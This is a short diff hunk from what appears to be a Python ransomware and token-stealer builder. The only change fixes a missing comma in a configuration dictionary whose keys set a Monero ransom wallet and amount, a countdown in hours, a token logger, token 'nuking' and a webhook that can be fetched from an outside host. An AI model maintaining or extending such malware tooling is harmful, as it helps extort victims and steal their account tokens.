@@ -57,7 +57,7 @@ class Main:
             "HOURS": hours,
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
-            "CRYPTO_TYPE": crypto_type
+            "CRYPTO_TYPE": crypto_type,
             "WEBHOOK": webhook if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
